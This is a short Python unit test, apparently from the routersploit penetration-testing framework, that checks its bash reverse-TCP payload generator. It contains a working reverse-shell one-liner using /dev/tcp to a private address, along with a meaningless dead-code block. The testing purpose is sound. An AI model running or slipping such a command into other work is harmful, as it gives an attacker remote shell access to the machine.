from routersploit.modules.payloads.cmd.bash_reverse_tcp import Payload
reverse_tcp = 'bash -i >& /dev/tcp/192.168.1.4/4321 0>&1'

def test_payload_generation():
    if False:
        while True:
            i = 10
    ' Test scenario - payload generation '
    payload = Payload()
    payload.lhost = '192.168.1.4'
    payload.lport = 4321
    assert payload.run() == reverse_tcp